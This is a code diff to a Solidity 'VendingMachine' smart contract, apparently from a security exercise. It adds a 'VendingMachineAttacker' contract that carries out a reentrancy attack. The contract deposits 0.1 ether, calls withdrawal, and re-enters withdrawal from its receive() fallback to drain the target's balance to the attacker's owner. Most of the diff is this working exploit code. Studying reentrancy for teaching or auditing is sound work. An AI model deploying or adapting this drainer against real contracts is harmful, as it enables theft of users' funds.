@@ -14,7 +14,7 @@ contract VendingMachine {
     mapping(address => uint256) public consumersDeposit;
 
     /**
-     * @dev Sets the values for {owner}, require contract {reserve} balance of 0.1 ether,
+     * @dev Sets the values for {owner}, require contract {reserve} balance of 1 ether,
      * initialize {peanuts} with a default value of 2,000 and {txCheckLock} with default
      * value of false.
      */
@@ -178,5 +178,41 @@ contract VendingMachine {
      */
     function hasNotBeenHacked() public view onlyOwner returns (bool) {
         return !txCheckLock;
+    }
+}
+
+contract VendingMachineAttacker {
+    address private immutable owner;
+    VendingMachine private immutable target;
+
+    uint256 private constant ETHER_TO_WITHDRAW = 0.1 ether;
+
+    constructor(address _target) {
+        target = VendingMachine(_target);
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        require(owner == msg.sender, "invalid");
+        require(msg.value == ETHER_TO_WITHDRAW, "invalid ether");
+
+        target.deposit{value: ETHER_TO_WITHDRAW}();
+
+        target.withdrawal();
+
+        (bool sent, ) = payable(owner).call{value: address(this).balance}("");
+
+        require(sent, "invalid ether transfer");
+    }
+
+    receive() external payable {
+        uint256 currentTargetBalance = address(target).balance;
+        if (currentTargetBalance == 0) {
+            return;
+        }
+        if (currentTargetBalance < ETHER_TO_WITHDRAW) {
+            return;
+        }
+        target.withdrawal();
     }
 }
